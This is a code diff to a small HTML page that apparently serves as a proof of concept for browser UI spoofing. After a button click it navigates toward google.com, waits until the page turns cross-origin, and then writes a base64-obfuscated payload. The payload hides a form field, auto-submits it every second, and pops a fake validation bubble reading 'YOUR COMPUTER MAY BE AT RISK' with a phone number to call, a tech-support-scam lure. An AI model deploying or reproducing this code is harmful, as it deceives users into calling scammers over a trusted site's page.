@@ -1,58 +1,27 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>iOS Web Share + Warning</title>
-  <style>
-    #aaa {
-      position: absolute;
-      left: 35%;
-    }
-  </style>
-</head>
+
 <body>
-
-<button id="startBtn">Start & Share</button>
-<div>Click the button, check warning, then print manually</div>
-
-<form>
-    <input placeholder="aaa" required id="aaa" />
-</form>
+<button onclick=foo()>go</button>
+</body>
 
 <script>
-document.getElementById('startBtn').onclick = async function() {
-    const aaa = document.getElementById("aaa");
-    // Custom warning untuk input
-    aaa.oninvalid = function(e) {
-        e.target.setCustomValidity(
-            "WARNING: YOU MAY BE AT RISK. COMPLETE COMPUTER CHECK!"
-        );
-    };
 
-    // Periksa input dan munculkan warning jika invalid
-    if (!aaa.checkValidity()) {
-        aaa.reportValidity();
-    }
+var w;
+var t;
+function foo(){
 
-    // Web Share API
-    if (navigator.share) {
-        try {
-            await navigator.share({
-                title: 'Security Check',
-                text: 'Coba Web Share API!',
-                url: 'https://example.com'
-            });
-            console.log('Sharing success!');
-        } catch(err) {
-            console.log('Sharing canceled or failed:', err);
-        }
-    } else {
-        alert('Web Share API tidak didukung di browser ini.');
-    }
+w = setTimeout('document.location = "http:/www.google.com"',2000)
+t = setInterval('bar()',1);
+}
 
-    // Optional: buka URL baru (popup friendly karena berasal dari klik user)
-    window.open('https://www.google.com', '_blank');
-};
+function bar(){
+try{
+w.location.href;
+}
+catch(e){
+clearInterval(t);
+setTimeout("document.write(atob('PHN0eWxlPgojYWFhewpwb3NpdGlvbjphYnNvbHV0ZTsKbGVmdDozNSU7Cn0KI2JiYnsKZGlzcGxheTpub25lOwp9Cjwvc3R5bGU+CjxzY3JpcHQ+CmZ1bmN0aW9uIHRlc3QoKXsKYWFhID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImFhYSIpOwphYWEuc3R5bGUub3BhY2l0eSA9ICcwJzsKYWFhLm9uaW52YWxpZCA9IGZ1bmN0aW9uIChlKSB7CmUudGFyZ2V0LnNldEN1c3RvbVZhbGlkaXR5KCJXQVJOSU5HIVxuWU9VUiBDT01QVVRFUiBNQVkgQkUgQVQgUklTSy5cbkNBTEw6IDgwMC0xMTEtMjIyMiIpOwp9OwpzZXRJbnRlcnZhbCgiZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JiYicpLmNsaWNrKCkiLDEwMDApOwp9Cjwvc2NyaXB0Pgo8Zm9ybT4KICAgIDxpbnB1dCBwbGFjZWhvbGRlcj0iYWFhIiByZXF1aXJlZCBpZD0iYWFhIiAvPgogICAgPGlucHV0IGlkPSdiYmInIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0Ij4KPC9mb3JtPg=='));test()",1000);
+}
+
+}
+
 </script>
-
-</body>
-</html>
